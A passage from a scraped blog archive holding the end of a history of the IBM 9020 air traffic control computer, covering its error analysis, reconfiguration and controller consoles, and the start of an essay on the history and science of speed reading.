limited ability to write timing analysis data (which, even on the slow computers, tended to be produced faster than the tape drives could write it and so had to fit within a buffer memory area for practical purposes) meant that it was only enabled as needed. The OEAP provided long-term analysis of the performance of the entire machine. Whenever the OEAP was invoked, even if it determined that a problem was transient or \"soft\" and took no action, it would write statistical records of the nature of the error and the involved elements. When the OEAP detected an unusually large number of soft errors from the same physical equipment, it would automatically reconfigure the system to remove that equipment from service and then generate an alarm.\\nAlerts generated by the OEAP were recorded by a printer connected to the System Console, and indicated by lights on the System Console. A few controls on the System Console allowed the operator manual intervention when needed, for example to force a reconfiguration.\\nOne of the interesting aspects of the OEAP is where it runs. The 9020 multisystem is truly a distributed one in that there is no \"leader.\" The control program, as we have discussed, simply starts on whichever machine is looking for work. In practice, it may sometimes run simultaneously on multiple machines, which is acceptable as it implements precautions to prevent stepping on its own toes.\\nThis model is a little more complex for the OEAP, because of the fact that it deals specifically with failures. Consider a specific failure scenario: loss of power. IBM equipped each of the functional components of the 9020 with a battery backup, but they only rate the battery backup for 5.5 seconds of operation. That isn't long enough for a generator to reliably pick up the load, so this isn't a UPS as we would use today. It's more of a dying gasp system: the computer can \"know\" that it has lost power and continue to operate long enough stabilize the state of the system for faster resumption.\\nWhen a compute element or I/O control element loses power, an interrupt is generated within that single machine that starts the OEAP. The OEAP performs a series of actions, which include generating an interrupt across the entire system to trigger reconfiguration (it is possible, even likely given the physical installations, that the power loss is isolated to the single machine) and resetting task states in the control program so that the machine's tasks can be restarted elsewhere. The OEAP also informs the system console and writes out records of what has happened. Ideally, this all completes in 5.5 seconds while battery power remains reliable.\\nIn the real world, there could be problems that lead to slow OEAP execution, or the batteries could fail to make it for long enough, or for that matter the compute element could encounter some kind of fundamentally different problem. The fact that the OEAP is executing on a machine means that something has gone wrong, and so until the OEAP completes analysis, the machine that it is running on should be considered suspect. The 9020 resolves this contradiction through teamwork: beginning of OEAP execution on any machine in the total system generates an interrupt that starts the OEAP on other machines in a \"time-down\" mode. The \"time-down\" OEAPs wait for a random time interval and then check the shared memory to see if the original OEAP has marked its execution as completed. If not, the first OEAP to complete its time-down timer will take over OEAP execution and attempt to complete diagnostics from afar. That process can, potentially, repeat multiple times: in some scenario where two of the three compute elements have failed, the remaining third element will eventually give up on waiting for the first two and run the OEAP itself. In theory,\\nsomeone\\nwill eventually diagnose every problem. IBM asserts that system recovery should always complete within 30 seconds.\\nLet's work a couple of practical examples, to edify our understanding of the Control Program and OEAP. Say that a program running on a Compute Element sets up a write operation for an I/O Control Element, which formats and sends the data to a Peripheral Adapter Module which attempts to send it to an offsite peripheral (say an air traffic control tower teleprinter) but fails. A timer that tracks the I/O operation will eventually fail, triggering the OEAP on the I/O control element running the task. The OEAP reads out the error register on its new home, discovers that it is an I/O problem related to a PAM, and then speaks over the channel to request the value of state registers from the PAM. These registers contain flags for various possible states of peripheral connections, and from these the OEAP can determine that sending a message has failed because there was no response. These types of errors are often transient, due to telephone network trouble or bad luck, so the OEAP increments counters for future reference, looks up the application task that tried to send the message and changes its state to incomplete, clears registers on the PAM and I/O control element, and then hands execution back to the Control Program. The Control Program will most likely attempt to do the exact same thing over again, but in the case of a transient error, it'll probably work this time.\\nConsider a more severe case, where the Control Program starts a task on a Compute Element that simply never finishes. A timer runs down to detect this condition, and an interrupt at the end of the timer starts the Control Program, which checks the state and discovers the still-unfinished task. Throwing its hands in the air, the Control Program sets some flags in the error register and hands execution to the OEAP. The OEAP starts on the same machine, but also interrupts other machines to start the OEAP in time-down mode in case the machine is too broken to complete error handling. It then reads the error register and examines other registers and storage contents. Determining that some indeterminate problem has occurred with the Compute Element, the OEAP triggers what IBM confusingly calls a \"logout\" but we might today call a \"core dump\" (ironically an old term that was more appropriate in this era). The \"logout\" entails copying the contents of all of the registers and counters to the preferential storage area and then directing, via channel, one of the tape drives to write it all to a tape kept ready for this purpose\u2014the syslog of its day. Once that's complete, the OEAP will reset the Compute Element and hand back to the Control Program to try again... unless counters indicate that this same thing has happened recently. In that case, the OEAP will update the configuration register on the running machine to change its status to offline, and choose a machine in online-standby. It will write to that machine's register, changing its status to online. A final interrupt causes the Control Program to start on both machines, taking them into their new states.\\nLengthy FAA procedure manuals described what would happen next. These are unfortunately difficult to obtain, but from IBM documentation we know that basic information on errors was printed for the system operator. The system operator would likely then use the system console to place the suspicious element in \"test\" mode, which completely isolates it to behave more or less like a normal S/360. At that point, the operator could use one of the tape drives attached to the problem machine to load IBM's diagnostic library and perform offline troubleshooting. The way the tape drives are hooked up to specific machines is important; in fact, since the OEAP is fairly large, it is only stored in one copy on one Storage Element. The 9020 requires that one of the tape drives always have a \"system tape\" ready with the OEAP itself, and low-level logic in the elements allows the OEAP to be read from the ready-to-go system tape in case the storage element that contains it fails to respond.\\nA final interesting note about the OEAP is a clever optimization called \"problem program mode.\" During analysis and handling of an error, the OEAP can decide that the critical phase of error handling has ended and the situation is no longer time sensitive. For example, the OEAP might decide that no action is required except for updating statistics, which can comfortably happen with a slight delay. These lower-priority remaining tasks can be added to memory as \"normal\" application tasks, to be run by the Control Program like any other task after error handling is complete. Think of it as a deferral mechanism, to avoid the OEAP locking up a machine for any longer than necessary.\\nFor the sake of clarity, I'll note again an interesting fact by quoting IBM directly: \"OEAP has sole responsibility for maintaining the system configuration.\" The configuration model of the 9020 system is a little unintuitive to me. Each machine has its own configuration register that tells it what its task is and whether it is online or offline (or one of several states in between like online-standby). The OEAP reconfigures the system by running on any one machine and writing the configuration registers of both the machine it's running on, and all of the other machines via the shared bus. Most reconfigurations happen because the OEAP has detected a problem and is working around it, but if the operator manually reconfigures the system (for example to facilitate testing or training), they also do so by triggering an interrupt that leads the Control Program to start the OEAP. The System Console has buttons for this, along with toggles to set up a sort of \"main configuration register\" that determines how the OEAP will try to set up the system.\\nThe Air Traffic Control Application\\nThis has become a fairly long article by my norms, and I haven't even really talked about air traffic control that much. Well, here it comes: the application that actually ran on the 9020, which seems to have had no particular name, besides perhaps Central Computing Complex (although this seems to have been adopted mostly to differentiate it from the Display Complex, discussed soon).\\nFirst, let's talk about the hardware landscape of the ARTCC and the 9020's role. An ARTCC handles a number of sectors, say around 30. Under the 9020 system, each of these sectors has three controllers associated with it, called the R, D, and A controllers. The R controller is responsible for monitoring and interpreting the radar, the D controller for managing flight plans and flight strips, and the A controller is something of a generalist who assists the other two. The three people sit at something like a long desk, made up of the R, D, and A consoles side by side.\\nThe R console is the most recognizable to modern eyes, as its centerpiece is a 22\" CRT plan-view radar display. The plan-view display (PVD) of the 9020 system is\\nsignificantly\\nmore sophisticated than the SAGE PVD on which it is modeled. Most notably, the 9020 PVD is capable of displaying text and icons. No longer does a controller use a light gun to select a target for a teleprinter to identify; the \"data blocks\" giving basic information on a flight were actually shown on the PVD next to the radar contact. A trackball and a set of buttons even allowed the controller to select targets to query for more information or update flight data. This was quite a feat of technology even in 1970, and in fact one that the 9020 was not capable of. Well, it was actually capable of it, but not initially.\\nThe original NAS stage A architecture separated the air traffic control data function and radar display function into two completely separate systems. The former was contracted to IBM, the latter to Raytheon, due to their significant experience building similar systems for the military. Early IBM 9020 installations sat alongside a Raytheon 730 Display Channel, a very specialized system that was nearly as large as the 9020. The Display Channel's role was to receive radar contact data and flight information in digital form from the 9020, and convert it into drawing instructions sent over a high-speed serial connection to each individual PVD. A single Display Channel was responsible for up to 60 PVDs. Further complicating things, sector workstations were reconfigurable to handle changing workloads. The same sector might be displayed on multiple PVDs, and where sectors met, PVDs often overlapped so the same contact would be visible to controllers for both sectors. The Display Channel had a fairly complex task to get the right radar contacts and data blocks to the right displays, and in the right places.\\nLater on, the FAA opted to contract IBM to build a slightly more sophisticated version of the Display Channel that supported additional PVDs and provided better uptime. To meet that contract, IBM used another 9020. Some ARTCCs thus had\\ntwo\\ncomplete 9020 systems, called the Central Computer Complex (CCC) and the Display Channel Complex (DCC).\\nThe PVD is the most conspicuous part of the controller console, but there's a lot of other equipment there, and the rest of it is directly connected to the 9020 (CCC). At the R controller's position, a set of \"hotkeys\" allow for quickly entering flight data (like new altitudes) and a computer readout device (CRD), a CRT that displays 25x20 text for general output. For example, when a controller selects a target on the PVD to query for details, that query is sent to the 9020 CCC which shows the result on the R controller's CRD above the PVD.\\nAt the D controller's position, right next door, a large rack of slots for flight strips (small paper strips used to logically organize flight clearances, still in use today in some contexts) surrounds the D controller's CRD. The D controller also has a Computer Entry Device, or CED, a specialized keyboard that allows the D controller to retrieve and update flight plans and clearances based on requests from pilots or changes in the airspace situation. To their right, a modified teleprinter is dedicated to producing the flight strips that they arrange in front of them. Flight strips are automatically printed when an aircraft enters the sector, or when the controller enters changes. The A controller's position to the right of the flight strip printer is largely the same as the D controller's position, with another CRD and CED that operate independently from the D controller's\u2014valuable during peak traffic.\\nWhile controller consoles are the most visible peripherals of the system, they're far from the only ones. Each 9020 system had an extensive set of teletypewriter circuits. Some of these were local; for example, the ATC supervisor had a dedicated TTY where they could not only interact with flight data (to assist a sector controller for example) but also interact with the status of the NAS automation itself (for example to query the status of a malfunctioning radar site and then remove it from use for PVDs).\\nSince the 9020 was also the locus of flight planning, TTYs were provided in air traffic control towers, terminal radar facilities, and even the dispatch offices of airlines. These allowed flight plans to be entered into the 9020 before the aircraft was handed off to enroute control. Flight service stations functioned more or less as the dispatch offices for general aviation, so they were similarly equipped with TTYs for flight plan management. In many areas, military controllers at air defense sectors were also provided with TTYs for convenient access to flight plans. Not least of all, each 9020 had high-speed leased lines to its neighboring 9020s. Flights passing from one ARTCC to the next had their flight strip \"digitally passed\" by transmission from one 9020 to the next.\\nA set of high-speed line printers connected to the 9020 printed diagnostic data as well as summary and audit reports on air traffic. Similar audit data, including a detailed record of clearances, was written to tape drives for future reference.\\nTo organize the whole operation, IBM divided the software architecture of the system into the \"supervisor state\" and the \"problem state.\" These are reasonably analogous to kernel and user space today, and \"problem\" is meant as in \"the problem the computer solves\" rather than \"a problem has occurred.\" The Control Program and OEAP run in the supervisor state, everything else runs after the Control Program has set up a machine in the Problem State and started a given program.\\nIBM organized the application software into five modules, which they called the five Programs. These are Input Processing, Flight Processing, Radar Processing, Output Processing, and Liaison Management. Most of these are fairly self-explanatory, but the list reveals the remarkably asynchronous design of the system. Consider an example, we'll say a general aviation flight taking off from an airport inside of one of the ARTCC's sectors.\\nThe pilot first contacts a Flight Service Station, which uses their TTY to enter a flight plan into the 9020. Next, the pilot interacts with the control tower, which in the process of giving a takeoff clearance uses their TTY to inform the 9020 that the flight plan is active. They may also update the flight plan with the aircraft's planned movements shortly after takeoff, if they have changed due to operating conditions. The Input Processing program handles all of these TTY inputs, parsing them into records stored on a Storage Element. In case any errors occur, like an invalid entry, those are also written to the Storage Element, where the Output Processing program picks them up and sends an appropriate message to the originating TTY. IBM notes that there were, as originally designed, about 100 types of input messages parsed by the input processing program.\\nAs the aircraft takes off, it is detected by a radar site (such as a Permanent System radar or Air Route Surveillance Radar) which digitally encodes the radar contact (a Raytheon system) for transmission to the 9020. The Radar Processing program receives these messages, converts radial radar coordinates to the XY plane used by the system, correlates contacts with similar XY positions from multiple radar sites into a single logical contact, and computes each contact's apparent heading and speed to extrapolate future positions. Complicating things, the 9020 went into service during the development of secondary surveillance radar, also known as the transponder system\\n2\\n. On appropriately equipped aircraft, the transponder provides altitude. The Radar Processing system makes an altitude determination on each aircraft, a slightly more complicated task than you might expect as, at the time, only some radar systems and some transponders provided altitude information. The Radar Processing program thus had to track if it had altitude information at all and, if so, where from. In the mean time, the Radar Processing program tracked the state of the radar sites and reported any apparent trouble (such as loss of data or abnormal data) to the supervisor.\\nI put a lot of time into writing this, and I hope that you enjoy reading it. If you can spare a few dollars, consider\\nsupporting me on ko-fi\\n. You'll receive an occasional extra, subscribers-only post, and defray the costs of providing artisanal, hand-built world wide web directly from Albuquerque, New Mexico.\\nThe Flight Processing program periodically evaluates all targets from the Radar Processing program against all filed flight plans, correlating radar targets with filed flight plans, calculating navigational deviations, and predicting future paths. Among other outputs, the Flight Processing program generated up-to-date flight strips for each aircraft and predicted their arrival times at each flight plan fix for controller's planning purposes. The Flight Processing program hosted a set of rules used for safety protections, such as separation distances. This capability was fairly minimal during the 9020's original development, but was enhanced over time.\\nThe Output Processing program had two key roles. First, it handled data that was specifically queued for it because of a reactive need to send data to a given output. For example, if someone made a data entry error or a controller queried for a specific aircraft's flight plan, the Input Processing program placed the resulting data in memory, where the Output Processing program would \"find it\" to format and send to the correct device. The Output Processing program also continuously prepared common outputs like flight data blocks and radar station status messages that were formatted once to a common memory buffer to be sent to many devices in bulk. For example, a new flight strip for an aircraft would be formatted and stored once, and then sent in sequence to every controller position with a relation to that aircraft.\\nLegacy\\nThe 9020 is just one corner of the evolution of air traffic control during the 1960s and 1970s, a period that also saw the introduction of secondary radar for civilian flights and the first effort to automate the role of flight service stations. These topics quickly spiral out into others: unlike the ARTCCs of the time, the flight service stations dealt extensively with weather and interacted with both FAA and National Weather Service teletype networks and computer systems. An early effort to automate the flight service function involved the use of a\\nteletext system\\noriginally developed for agricultural use as a \"flight briefing terminal.\" That wasn't the agricultural teletext system in Kentucky that I discussed, but a different one, in Kansas. Fascinating things everywhere you look!\\nThis article has already become long, though, and so we'll have to save plenty for later. To round things out, let's consider the fate of the 9020. SAGE is known not only for its pioneering role in the computing art, but because of its remarkably long service life, roughly from 1958 to 1984. The 9020 was almost 20 years younger than SAGE, and indeed outlived it, but not by much. In 1982, IBM announced the IBM 3083, a newer implementation of the Enhanced S/370 architecture that was directly descended from S/360 but with greatly improved I/O capabilities. In 1986, the FAA accepted a new 3083-based system called \"HOST.\" Over the following three years, all of the 9020 CCCs were replaced by HOST systems.\\nThe 9020 was not to be forgotten so easily, though. First, the HOST project was mostly limited to hardware modernization or \"rehosting.\" The HOST 3083 computers ran most of the same application code as the original 9020 system, incorporating many enhancements made over the intervening decades.\\nSecond, there is the case of the Display Channel Complex. Once again, because of the complexity of the PVD subsystem the FAA opted to view it as a separate program. While an effort was started to replace the 9020 DCCs alongside the 9020 CCCs, it encountered considerable delays and was ultimately canceled. The 9020 DCCs remained in service controlling PVDs until the ERAM Stage A project replaced the PVD system entirely in the 1990s.\\nWhile IBM's efforts to market the 9020 overseas generally failed, one reduced-size \"simplex\" 9020 CCC system was sold to the UK Civil Aviation Authority for use in the London Air Traffic Centre. This 9020 remained in service until 1990, and perhaps because of its singularity and unusually long life, it is better remembered as a historic object.\\nThere are photos\\n.\\nThe term National Airspace System (NAS) is still in use today, but is now more of a concept than a physical thing. The NAS is the totality of the regulations, procedures, and communications systems used in air traffic control. During the NAS Enroute Stage A project, IBM and the FAA both seem to have used \"NAS\" to describe the ARTCC computer system as a physical object, although I think it was debatable even then whether or not this was an appropriate use of the term. One of the difficulties in researching the history of civilian air traffic control is that the FAA seems to have been particularly bad about names. \"NAS Enroute Stage A\" is not very wieldy but is one of the only terms that unambiguously refers to the late-'60s, early-'70s IBM 9020-based ARTCC system, and even then it is confusing with the later enroute automation modernization (ERAM) program, complete with its own stage A. I refer to the ARTCC automation system simply as \"the IBM 9020\" even though this is incorrect (consider for example that the complete system often involved a display subsystem built by Raytheon), and you will find contemporary references to it as \"NAS,\" \"NAS stage A,\" \"NAS automation,\" etc.\\n\u21a9\\nOne of the responsibilities of the 9020 was the assignment of non-overlapping transponder codes as well.\\n\u21a9</p>"},{"location":"computer.rip/speed%20reading%20%28the%20meaning%20of%20language%29_20260205/","title":"speed reading (the meaning of language)\\n\\n\u6765\u6e90: https://computer.rip\\n\u94fe\u63a5: https://computer.rip/2025-12-08-speed-reading.html\\n\u65e5\u671f: 08 Dec 2025 00:00:00 UT\\n\\n---\\n\\nOne of the difficult things about describing a grift, or at least what became","text":"<p>a grift, is judging the sincerity with which the whole thing started. Scams often crystallize around a kernel of truth: genuinely good intentions that start rolling down the hill to profitability and end up crashing through every solid object along the way. I'm not totally sure about Evelyn Wood; she seems to have had all the best in mind but still turned so quickly to hotel conference room seminars that I have trouble lending her the benefit of the doubt.\\nStill, she was a teacher, and I am inclined to be sympathetic to teachers. Funny, then, that Wood's journey to fame started with another teacher. His curious reading behavior, whether interpreted as intense attention or half-assed inattention, set into motion one of the mid-century's greatest and, perhaps, most embarrassing executive self-help sensations.\\nIn 1929, Evelyn Wood earned a bachelor's in English at the University of Utah. The following two decades are a bit obscure; she took various high-school jobs around Utah leading ultimately to Salt Lake City's Jordan High School. There, as a counselor to girl students, Wood found that many students struggled because of their reading. Assigned books were arduous, handouts discarded. These students struggled to read so severely that it hampered their performance in every area. She launched a remedial reading program of her own design, during which she made her first discovery: as her students learned to read faster, their comprehension improved. Then their grades\u2014in every subject\u2014followed suit. Reading, she learned, was a foundational skill. A person could learn more, do more,\\nachieve more,\\nif only they could read faster.\\nWood became fascinated with reading, probably the reason for her return to the University of Utah for a master's degree in speech. Around 1946, she turned her thesis in to Dr. Lowell Lees. Lees was the chair of the Speech and Theater Department, and had a hand in much of the development of Utah theater from the Great Depression until his death in the 1950s. A period photo of Lees depicts him with a breastplate-microphone intercom headset and a look of concentration, hands on the levers of a mechanical variac dimmer rack. He is backstage of either \"Show Boat\" or \"A Midsummer Night's Dream\" at the university's summer theater festival. A theater department chair on lights seems odd, yes, but theater was Lees passion.\\nPerhaps reading was not. When Wood turned her thesis into Lees, he \"read, graded, and returned the thesis within a matter of minutes.\" Wood was amazed that he seemed to just leaf through the pages, but then still had insightful questions to ask. Perhaps I am too cynical. It feels most likely to me that Lees was already familiar with the contents (he was probably Wood's advisor and would have discussed the research plenty of times before) and just didn't bother to read the final document. To Wood, though, something more remarkable had happened. With a series of tests, she convinced herself that Dr. Lees could read over 6,000 words per minute with full comprehension.\\nA typical American college graduate can read at about 250 words per minute, at least if the material isn't too challenging. Some people, Wood contends, are \"10x readers.\" They read so quickly, and with such good understanding, that they simply outpace the rest of us at every intellectual pursuit. What's more, Wood could make\\nyou\\none of those people. As she tells it, she spent two years, probably in the 1950s, tracking down fifty some examples of other exceptional readers. She published \"Reading Skills\" in 1958, a book evidently based on some of this research but more focused on remedial skills for grade students than executive achievement.\\nThe introduction of Reading Skills tells us of ten different students. Anna was pretty, but she couldn't read. Joseph hated school, because he couldn't read. Carl's hair is a mess, and his parents neglectful. He also can't read. All of them became proficient readers through Wood's program. But Wood had more in mind than grade students. A year later, with her business-educated husband, she brought her reading program to adults by launching a chain of training centers under the name\\nEvelyn Wood Reading Dynamics.\\nBooks neither bored nor scared me any longer. I could read almost any book within an hour, and more important, I better understood that which I read.\\nReading Dynamics became a sensation. Over the following years, Evelyn Wood institutes opened across the country. The speed reading movement received a considerable boost from President John F. Kennedy\u2014he claimed to read at 1,200 words per minute, a skill he learned in part through a correspondence speed reading course. It wasn't one of Evelyn Wood's, but that detail was mostly lost on the public and the success of the Kennedies became linked to Reading Dynamics. He seems to have bought the same course for his brother Ted, and encouraged his staff to take speed reading courses as well. Reading Dynamics didn't miss the marketing opportunity, and indeed the very first dedicated Institute opened in Washington, D.C. and advertised specifically to politicians. Senators and representatives were among her earliest students and her strongest advocates.\\nEvelyn Wood Reading Dynamics underwent several changes of ownership through the 1960s, but Wood stayed on as developer of the training materials. Soon there were more than 60 institutes, and newspaper ads directed the interested public to \"free mini-lessons\" held in the meeting rooms of fine hotels across the country. It became a franchise system, with the Woods personally owning the franchise for Utah and Idaho. The company's fortunes have trended up and down with those of speed reading as a concept, but genuine Evelyn Wood speed reading courses are still available today from business training firm Pryor. There has been a bit of a reckoning: far from the 1,000+ WPM rates promised by early Evelyn Wood marketing material, Pryor now advertises \"a potential rate of 400-700 words per minute.\" These numbers align with the upper end of reading speeds observed among the general population. In effect, Pryor no longer claims that speed reading courses will make you a faster reader than more conventional methods of training reading, like just doing a lot of it.\\nThe science has never really been with speed reading. As early as 1959, when Reading Dynamics hit Washington, researchers and educators called Wood's data and methods into question. As with most self-help materials, Wood's writing was heavy on anecdotes and light on quantitative analysis. Certain elements of her method contradicted psychology's growing understanding of human language and perception. At the core of the problem, though, was her promise of comprehension.\\nIt is obvious that a person can \"read\" a document very quickly, if we relax our definition of \"read.\" This is just as obvious to the developers of speed reading courses. Many advise students to start by skimming, flipping through the whole book or document and taking in the headings and subjects. You can certainly get through a book under an hour that way, but of course, you haven't exactly read it. Think of it as a lossy process: the less time you spend on a document, the less you comprehend and retain its contents. That seems pretty intuitive, doesn't it?\\nBut Wood disagreed, or at least, the company she founded did. It can be a little difficult to untangle Evelyn Wood's original theory from the many generations of Reading Dynamics and competing speed reading systems that followed. Subsequent owners of Reading Dynamics, which included companies like the publisher of Encyclopedia Britannica, made significant revisions to the material. By the 1970s, Wood's role was more as a celebrity spokesperson than a teacher. In any case, Reading Dynamics came to emphasize a key principle that reading faster actually improves comprehension. The most skilled readers, Reading Dynamics taught, don't even read words. They scan a page vertically, not horizontally, taking in an entire line at a time by peripheral vision. There is no need to sound out, read, recognize, or even really see individual words, as the mind actually processes language in large chunks at a time. Reading occurs mostly subconsciously, so in a way all you have to do is see the text and\\nbelieve\\nthat you have read it, and you will retain the content.\\nIn a 2016 review paper on speed reading, a team of psychologists deliver bad news: it just doesn't hold up. Laboratory studies confirm that the eye only has the acuity to distinguish words in a small area, and that reading requires fixating on just about every word individually. That doesn't even matter, though, because other laboratory experiments strongly suggest that the limiting factor on reading speed is not the eyes at all but the mind. Even when clever computer techniques are developed to present text more quickly, comprehension trails off at about the same speed. In fact, when humans read, we\\nregard\\nan even smaller area of our vision than the limits of the fovea would suggest. When looking at a word, we are basically blind to anything further than about seven characters away.\\nThe problems with speed reading are not merely theoretical, though. The researchers considered studies of actual speed readers, people who had either completed speed reading courses or claimed to naturally read at exceptional speeds. Almost no studies can be found that support the claim of faster reading with retained comprehension. Speed readers perform poorly on comprehension tests on new material. People who \"speed read\" a document generally show similar comprehension to people who have no speed reading training but skimmed the document in the same period of time. When speed readers have performed better, researchers suspect the result comes more from advanced familiarity with the material (a common problem with speed reading courses that use the same texts repeatedly), broader general education (you retain more from non-fiction material if you already knew the information to begin with), and greater experience and confidence in \"interpolating\" by speculating as to the content of the text that wasn't actually read.\\nUltimately, eye tracking experiments tend to confirm the worst. People who speed read don't do all that much actual reading. Skilled speed readers skip much of the text completely, and tend to make things up when asked about things they never fixated on. Most interesting, there seems to be a certain Dunning-Kruger effect at play. People who have speed-read a book on a subject, for example, tend to rate their knowledge of the subject highly and then perform very poorly on questions about it (often scoring similar to chance on multiple choice tests). Speed reading, it turns out, is a placebo. It makes you feel like you have read something, even though you haven't.\\nAnd yet we still have speed reading. Wood's efforts were perhaps sincere, but the commercial imperative of the growing Reading Dynamics institutes steered the whole thing away from evidence-based methods and towards ideas with an increasingly tenuous connection to reality. The on-again, off-again success of Reading Dynamics left a lot of room for imitators, or innovators, depending on your perspective. Evelyn Wood's original strain of speed reading has mostly fallen away, replaced by a new set of courses that build on Wood's ideas\u2014the worst of them.\\nTake, for example, the work of Paul Scheele. Scheele is one of those business conference motivational speaker types, the kind of person who is introduced with a vast and impressive resume but who doesn't seem to have really done anything. With a PhD in \"Leadership and Change,\" he founded Scheele Learning Systems to market a series of innovations. His work is so interconnected with other self-help and new-age grifts that it can be hard to untangle what comes from where, but one of their key programs clearly builds on the Evelyn Wood method: PhotoReading.\\nThe basic concept of PhotoReading is that the mind is able to subconsciously process far more information than the conscious mind. In a marketing sheet, he writes:\\nYour conscious mind can handle seven pieces of information at a time, while your subconscious mind can handle a staggering 20,000 pieces of information. That's the difference between regular reading and PhotoReading.\\nSo imagine a future in which you pick up a book, flip through the pages, and in a matter of minutes gain a full command of the material contained therein. The key is that you don't actually have to read anything, you just have to\\nsee\\nit and your subconscious mind files every word away for later retrieval.\\nWell, of course, it's not quite that simple. There's a whole technique to it, a technique that you can learn from a self-guided digital course for only $530. Sure, that might seem a little steep, but consider that it's a package that includes not only the course but \"The PhotoReading Activator Paraliminal CD.\" Paraliminal activation or paraliminal hypnosis is another major product from Scheele Learning Systems, although I think it's licensed at least in part from a different organization (Centerpointe Research Institute) founded by different cranks (\"transcendental meditation\" enthusiasts Bill Harris and Wes Wait). The idea of paraliminal activation is roughly halfway between subliminal inducement videos\\n1\\nand binaural beats\\n2\\n, in that it's both of them mixed together. Incidentally, a lot of subliminal videos are like that anyway, so I'm not sure that Scheele is offering anything you can't get for free. All of these organizations offer rotating carousels of endorsements from famous and successful customers. The fact that these happy customers are almost invariably self-help authors or business conference motivational speakers goes unremarked upon.\\nScheele's ultimate claim is that PhotoReading allows you \"to 'mentally photograph' the printed page at 25,000 words per minute.\" 600-800 WPM is an excellent, exceptional reading rate among the normal population. For today's speed reading industry, though, 25,000 WPM is the bar to meet. \"Harry Potter and the Deathly Hallows\" counts up to about 198,000 words. An experienced PhotoReader, then, ought to be able to complete it in around eight minutes. Well, celebrity speed reader Ann Jones says it took her 47, so no one is perfect. She knocked out \"Go Set a Watchman\" in 25 and a half, and that on live television. Yes, for the most successful speed readers, people who claim rates in excess of 10,000 WPM, there's almost always some aspect of performance involved... whether that's television appearances or elected office. 25,000 WPM became cemented because it's the rate at which the Guinness World Records clocked celebrity speed reader Howard Berg. Actually, there's a woman who claims to have a Guinness World Record at 80,000 WPM, but it's hard to substantiate as Guinness stopped publishing the speed reading record at all decades ago. I suppose it became too questionable for even them.\\nThe reason I'm so fascinated by speed reading is its close interconnection to the concept of the executive. One of the earliest newspaper ads for Reading Dynamics reads \"For Executives, Businessmen, Students, Housewives.\" The housewives part doesn't quite fit the theme, but I think that might be better understood with the Utah LDS context of the housewife side hustle. Multi-level marketing schemes were becoming a cornerstone of the Salt Lake City business scene during the 1960s, a role they still fill today, and MLM brands like Avon found their success in part by melding the two worlds of the housewife and the business executive. Feminine products sold with masculine hustle, you might venture; some housewives were applying themselves to business with a zeal that would make a railroad baron blush.\\nFor students, the motivation is more obvious. Much of education comes down to reading, and we all remember the feeling of a paper due in two days on a book that you haven't yet opened. For the student, getting good comprehension of a text in a fraction of the time is an incredible offer. So promising was speed reading for education that, in its early days, it found considerable adoption in the educational establishment. Many universities offered speed reading courses, some even made them core curriculum. A particularly prominent speed reading course at Harvard served as the pattern on which many others were taught. Besides a series of demonstration films developed Harvard, devices called \"reading regulators\" or \"reading accelerators\" were popular lab equipment for these courses. They automated Evelyn Wood's idea of running a ruler down the page, sliding a metal shield down the page faster and faster to force the student to read at a higher and higher rate. For a few years, speed reading for universities became an entire industry, but it was short lived. Academic speed reading courses faded away as criticisms of Wood's theories became better known and attempts at validating speed reading continued to fail.\\n\"Speed reading,\" it turns out, did not work out in education. But perhaps that's a matter of framing. If we consider the broader landscape of \"things that promise to save you time reading,\" speed reading is just one in a long line of ideas. It turns out that students have been trying to skip the reading for just about as long as there has been reading\u2014consider Monarch Notes, a line of book summaries and critical commentary already available a hundred years ago. From Monarch to CliffsNotes to Chegg, students have looked to a whole sector of the publishing industry to do the hard work of actually reading books for them. You could say that the purpose of these digests or study guides is to help a student maintain the appearance that they have read a text even though they have not, by imparting only the parts of the text that are most important... important either because they are key to the plot or theme,\\nor\\nbecause they are likely to appear on exams or be expected in papers.\\nWhile students have an obvious need for these types of summaries (scoring well on assignments with less time invested), the appeal to the business executive might seem a little fuzzier. Well, unless we take the cynical view that the ultimate goal of an executive is to\\nlook smart,\\nand I'm not sure that you really have to be so cynical to accept that as truth.\\nSummarizations are obviously \"lossy,\" in that a digest form of a book cannot possibly contain the full information of the original book. Similarly, the weight of scientific evidence, as well as most credible practical experience, tells us that speed reading is a lossy process. There is, as the psychologists put it, no silver bullet in reading. Comprehension takes time; less time means less comprehension; and while you likely can improve your reading speed it will take years of practice.\\nAnd yet book summaries are an even larger industry than speed reading, and one that is both older and better adapted to the modern age. There clearly is a market for fast, low-comprehension reading of large texts. The audience is not purely made up of people seeking to create the appearance of work they have not done, although that's clearly a large part of it. Consider the magazine book review: long a staple of magazines, book reviews serve two purposes. They give you an idea of whether or not a book is worth reading, but they also summarize the book, or at least explain the major themes. That gives you some of the content of the book, the major ideas and a few choice details, in just a page of three-column prose. A third of that might be taken up by a wine club ad, to boot.\\nThe case of the magazine book review reminds us that there is a\\nserious,\\na\\nrespectable\\napplication for summaries. The perfect example might be the lawyer or doctor, people who are paid explicitly for their expertise and education but who also make heavy use of digests and summaries and desk references. There is a lot of information in the modern world, even in any given field, and no one can keep track of all of it. You might need to speed read, to use the CliffsNotes, just to keep up with the state of the field and find the things that you do need to read in their full length.\\nAnd so we have seen the dual facets of the executive demand for speed reading: the businessman, the leader, the executive is the perfect intersection of the professional need to find what to read and the personal need to look like you have done a lot of reading. Executives are expected to know what's out there, but also to seem like they already know all of it. It's a matter of opinion which of these is more prominent, but I think we can all agree that publications like\\nCTO Magazine\\nare aimed at that dual purpose.\\nWell, these days, publications like\\nCTO Magazine\\nare mostly aimed at drumming up AI hype. That's the other thing about business publishing: it is itself a business, and as beholden to the trends as any other.\\nThe funny thing about speed reading is that it has\\nnever\\nbeen that credible. Evelyn Wood's theories were inconsistent with the research and, frankly, a bit \"out there\" even as she developed them into a business in the 1960s. Experiments on speed reading, some of them conducted by the same people selling courses, have always shown iffy to clearly negative results. And yet speed reading has, in its good times, enjoyed a level of credibility and popularity that seems out of step with even its promises and certainly with its outcomes.\\nUS Presidents Kennedy, Carter, and Nixon were all speed readers. Carter and Nixon both arranged Evelyn Wood Reading Dynamics courses for their staff, and it seems that Kennedy probably purchased some sort of course for White House staff as well. This was very much perceived as an endorsement from the top, and speed reading became not just a new innovation in education, not just a trend, but practically a requirement for any serious leader. Marketing, and the celebrity adoption that it intentionally engineered, outpaced the results. Evelyn Wood's newspaper ads and reputation got so far out front of the actual pedagogy that today's speed reading industry, spinning ever farther from reason, continues to coast on the same set of presidents.\\nThat's not to say that there has been nothing new in speed reading. In 1984, psychologist Mary C. Potter described a method called \"rapid serial visual presentation\" or RSVP. The idea of RSVP is to 